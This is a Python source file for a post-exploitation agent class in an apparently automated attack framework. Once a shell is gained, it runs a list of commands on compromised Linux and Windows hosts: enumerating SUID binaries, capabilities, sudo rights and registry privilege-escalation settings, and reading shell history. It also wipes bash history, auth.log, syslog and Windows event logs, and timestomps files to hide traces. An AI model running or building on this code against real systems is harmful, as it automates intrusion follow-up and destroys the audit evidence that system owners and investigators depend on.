import logging
from core.data_models import AgentData, Strategy
from typing import Dict, List, Optional
from core.data_models import PostExReport, PostExFinding, Strategy, AttackPhase, ErrorType
from core.logger import log
import asyncio
import re
import time
from core.shell_manager import ShellManager
from core.target_model_manager import TargetModelManager

from core.base_agent import BaseAgent


class PostExAgent(BaseAgent):
    supported_phases = [AttackPhase.ESCALATION]
    required_tools = []
    """
    An agent for performing post-exploitation enumeration on a compromised host.
    """

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.shell_manager: Optional[ShellManager] = None
        self.target_model_manager: Optional[TargetModelManager] = None
        self.pubsub_manager = orchestrator.pubsub_manager
        self.report_class = PostExReport
        self.linux_commands = {
            "user": "whoami",
            "hostname": "hostname",
            "os_info": "uname -a",
            "os_release": "cat /etc/os-release",
            "cpu_info": "lscpu",
            "network_info": "ip a || ifconfig",
            "processes": "ps aux",
            "open_files": "lsof -n",
            "netstat": "netstat -antup",
            "home_dir_listing": "ls -la /home",
            "root_dir_listing": "ls -la /root",
            "sudo_version": "sudo -V",
            "groups": "id",
            "iptables": "iptables -L",
            "services": "systemctl list-units --type=service",
            "mounts": "mount",
            "crontab": "crontab -l",
            "bash_history": "cat ~/.bash_history",
            "suid_files": "find / -perm -4000 -type f 2>/dev/null",
            "sgid_files": "find / -perm -2000 -type f 2>/dev/null",
            "writable_dirs": "find / -writable -type d 2>/dev/null",
            "getcap_files": "getcap -r / 2>/dev/null",
            "installed_packages_deb": "dpkg -l",
            "installed_packages_rpm": "rpm -qa",
            "sudo_permissions": "sudo -l -n",
            "log_clean_bash_history": "echo '' > ~/.bash_history",
            "log_clean_auth_log": "> /var/log/auth.log",
            "log_clean_syslog": "> /var/log/syslog",
            "timestomp": "touch -r {ref_file} {target_file}"
        }
        self.windows_commands = {
            "user": "whoami",
            "hostname": "hostname",
            "os_info": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
            "network_info": "ipconfig /all",
            "processes": "tasklist",
            "users": "net user",
            "groups": "wmic group get name, sid",
            "net_logins": "wmic netlogin get name, lastlogon, badpasswordcount",
            "services": "net start",
            "firewall_rules": "netsh advfirewall firewall show rule name=all",
            "env": "set",
            "installed_software": "wmic product get name,version",
            "unquoted_service_paths": "wmic service get name,pathname,displayname,startmode | findstr /i /v \"c:\\windows\\system32\\\" | findstr /i /v \"\\\"",
            "always_install_elevated_hkcu": "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "always_install_elevated_hklm": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "log_clean_security_log": "wevtutil cl Security",
            "log_clean_system_log": "wevtutil cl System",
            "log_clean_application_log": "wevtutil cl Application"}

    async def setup(self):
        """Asynchronous setup method for PostExAgent."""
        self.shell_manager = await self.context_manager.get_context('shell_manager')
        self.target_model_manager = await self.context_manager.get_context('target_model_manager')
        await self.pubsub_manager.subscribe("exploit_events", self._handle_exploit_event)

    async def _handle_exploit_event(self, message: dict):
        """Callback for exploit_events."""
        log.info(f"PostExAgent: Received exploit event: {message}")
        if message.get("event_type") == "EXPLOIT_SUCCESS":
            shell_id = message.get("shell_id")
            if shell_id:
                log.info(f"PostExAgent: Exploit successful, new shell_id: {shell_id}. Adding post-exploitation strategy.")
                new_strategy = Strategy(
                    phase=AttackPhase.ESCALATION,
                    next_agent="PostExAgent",
                    directive=f"Perform post-exploitation enumeration on shell {shell_id}",
                    context={"shell_id": shell_id}
                )
                log.warning(f"PostExAgent: New strategy for post-exploitation on shell {shell_id} generated. Orchestrator needs to pick this up.")
            else:
                log.warning("PostExAgent: EXPLOIT_SUCCESS event received but no shell_id found.")

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute post ex agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _analyze_data(self, raw_outputs: Dict[str, str], os_type: str) -> (List[PostExFinding], List[Dict[str, str]]):
        """Analyzes the raw output from the enumeration commands to find potential vectors and interesting binaries."""
        findings = []
        binaries = []

        if os_type == "Linux":
            # Analyze SUID files
            suid_output = raw_outputs.get(
                self.linux_commands["suid_files"], "")
            if suid_output:
                for line in suid_output.splitlines():
                    if not line.strip().startswith(('/usr/bin/', '/usr/sbin/', '/usr/lib/', '/bin/', '/sbin/')):  # Filter out common safe binaries
                        path = line.strip()
                        findings.append(PostExFinding(
                            type="suid_binary", description=f"Potentially interesting SUID file found: {path}", confidence=0.8))
                        binaries.append({"path": path, "type": "suid"})

            # Analyze getcap files
            getcap_output = raw_outputs.get(
                self.linux_commands["getcap_files"], "")
            if getcap_output:
                for line in getcap_output.splitlines():
                    if "+ep" in line:
                        path = line.strip().split(' ')[0]
                        findings.append(PostExFinding(
                            type="getcap_binary", description=f"Binary with capabilities found: {line.strip()}", confidence=0.8))
                        binaries.append({"path": path, "type": "getcap"})

            # Analyze writable directories
            writable_dirs_output = raw_outputs.get(
                self.linux_commands["writable_dirs"], "")
            if writable_dirs_output:
                for line in writable_dirs_output.splitlines():
                    if any(d in line for d in ["/etc", "/bin", "/usr/bin"]):
                        findings.append(PostExFinding(
                            type="writable_directory", description=f"Potentially interesting writable directory found: {line.strip()}", confidence=0.9))

            # Analyze sudo permissions
            sudo_output = raw_outputs.get(
                self.linux_commands["sudo_permissions"], "")
            if "(ALL : ALL) NOPASSWD: ALL" in sudo_output:
                findings.append(PostExFinding(
                    type="sudo_nopasswd", description="User can run any command as root without a password.", confidence=1.0))

        if os_type == "Windows":
            # Analyze unquoted service paths
            unquoted_paths_output = raw_outputs.get(
                self.windows_commands["unquoted_service_paths"], "")
            if unquoted_paths_output:
                for line in unquoted_paths_output.splitlines():
                    if line.strip():
                        findings.append(PostExFinding(
                            type="unquoted_service_path", description=f"Unquoted service path found: {line.strip()}", confidence=0.9))

            # Analyze AlwaysInstallElevated registry keys
            hkcu_output = raw_outputs.get(
                self.windows_commands["always_install_elevated_hkcu"], "")
            hklm_output = raw_outputs.get(
                self.windows_commands["always_install_elevated_hklm"], "")

            hkcu_set = "AlwaysInstallElevated    REG_DWORD    0x1" in hkcu_output
            hklm_set = "AlwaysInstallElevated    REG_DWORD    0x1" in hklm_output

            if hkcu_set and hklm_set:
                findings.append(PostExFinding(type="always_install_elevated",
                                description="AlwaysInstallElevated is set in both HKCU and HKLM.", confidence=1.0))

        return findings, binaries

    async def run(self, strategy: Strategy, **kwargs) -> PostExReport:
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            log.error(
                "[PostExAgent] No shell_id provided in the strategy context.")
            end_time = time.time()
            return PostExReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=None,
                errors=["No shell_id provided."],
                error_type=ErrorType.CONFIGURATION,
                summary="Post-exploitation failed: Missing shell ID."
            )

        log.info(f"[PostExAgent] Starting enumeration on shell {shell_id}.")

        raw_outputs = {}

        # 1. Determine OS
        os_check_output = await self.shell_manager.send_command(shell_id, "uname -a")
        if "GNU/Linux" in os_check_output or "Linux" in os_check_output:
            os_type = "Linux"
            commands_to_run = self.linux_commands
            log.info("Detected Linux OS.")
        else:
            # Fallback to check for Windows
            os_check_output_win = await self.shell_manager.send_command(shell_id, "ver")
            if "Microsoft Windows" in os_check_output_win:
                os_type = "Windows"
                commands_to_run = self.windows_commands
                log.info("Detected Windows OS.")
            else:
                error_msg = f"Could not determine OS. Uname output: {os_check_output}. Ver output: {os_check_output_win}"
                log.error(error_msg)
                end_time = time.time()
                return PostExReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id,
                    errors=[error_msg],
                    error_type=ErrorType.LOGIC,
                    summary="Post-exploitation failed: Could not determine OS."
                )

        async def run_and_collect(key, command):
            log.info(f"[PostExAgent] Running command: {command}")
            output = await self.shell_manager.send_command(shell_id, command)

            if "Error:" in output or "not found" in output or "is not recognized" in output:
                log.warning(
                    f"[PostExAgent] Command '{command}' may have failed: {output[:100]}")
            else:
                log.info(
                    f"[PostExAgent] Received {len(output)} bytes of output for '{key}'.")

            return key, command, output

        tasks = [run_and_collect(key, command)
                 for key, command in commands_to_run.items()]
        results = await asyncio.gather(*tasks)

        # Create report after gathering results
        report = PostExReport(shell_id=shell_id, os_info=os_type)

        for key, command, output in results:
            raw_outputs[command] = output
            if hasattr(report, key) and key != 'os_info':
                setattr(report, key, output.strip())

        report.raw_output = raw_outputs

        # Analyze the collected data
        report.analysis, discovered_binaries = self._analyze_data(
            raw_outputs, os_type)

        # Update the TargetModel with discovered binaries
        if discovered_binaries:
            log.info(
                f"Found {len(discovered_binaries)} interesting binaries. Updating TargetModel.")
            target_host = await self.context_manager.get_context('target_host')
            target_model = self.target_model_manager.get_target(
                target_host)
            if target_model:
                # Avoid duplicates
                existing_paths = {b['path'] for b in target_model.binaries}
                for binary in discovered_binaries:
                    if binary['path'] not in existing_paths:
                        target_model.binaries.append(binary)
                self.target_model_manager.save_model(target_model)

        summary = f"Enumeration and analysis complete for shell {shell_id}. Found {len(report.analysis)} potential findings."
        log.success(f"[PostExAgent] {summary}")

        # Step 3: Clear logs if requested
        if strategy.context.get("clear_logs", False):
            log.info("Log cleaning requested.")
            privilege_level = "root" if os_type == "Linux" and report.user == "root" else "administrator" if os_type == "Windows" and "administrator" in report.user.lower() else "user"
            report.log_cleaning_status = await self._clear_logs(shell_id, os_type, privilege_level)
            log.info(f"Log cleaning status: {report.log_cleaning_status}")

        # Step 4: Timestomp if requested
        timestomp_target = strategy.context.get("timestomp_file")
        if timestomp_target and os_type == "Linux":
            log.info(f"Timestomping requested for file: {timestomp_target}")
            ref_file = "/etc/passwd"  # A common, stable file
            command = self.linux_commands["timestomp"].format(
                ref_file=ref_file, target_file=timestomp_target)
            await self.shell_manager.send_command(shell_id, command)
            log.info(f"Executed timestomp command: {command}")

        # Finalize and return report
        report.agent_name = self.__class__.__name__
        report.start_time = start_time
        report.end_time = time.time()
        report.summary = summary
        return report

    async def _clear_logs(self, shell_id: str, os_type: str, privilege_level: str) -> str:
        """Clears logs on the target system based on OS and privilege level."""
        log.info(
            f"Clearing logs on {os_type} system with {privilege_level} privileges.")
        commands_to_run = []
        if os_type == "Linux":
            commands_to_run.append(
                self.linux_commands["log_clean_bash_history"])
            if privilege_level == "root":
                commands_to_run.append(
                    self.linux_commands["log_clean_auth_log"])
                commands_to_run.append(self.linux_commands["log_clean_syslog"])
        elif os_type == "Windows":
            if privilege_level == "administrator":
                commands_to_run.append(
                    self.windows_commands["log_clean_security_log"])
                commands_to_run.append(
                    self.windows_commands["log_clean_system_log"])
                commands_to_run.append(
                    self.windows_commands["log_clean_application_log"])

        if not commands_to_run:
            return "No log cleaning commands were run for the current privilege level."

        results = []
        for command in commands_to_run:
            output = await self.shell_manager.send_command(shell_id, command)
            if "error" in output.lower() or "permission denied" in output.lower():
                results.append(
                    f"Failed to run '{command}': Permission denied.")
            else:
                results.append(f"Successfully ran '{command}'.")

        return " ".join(results)
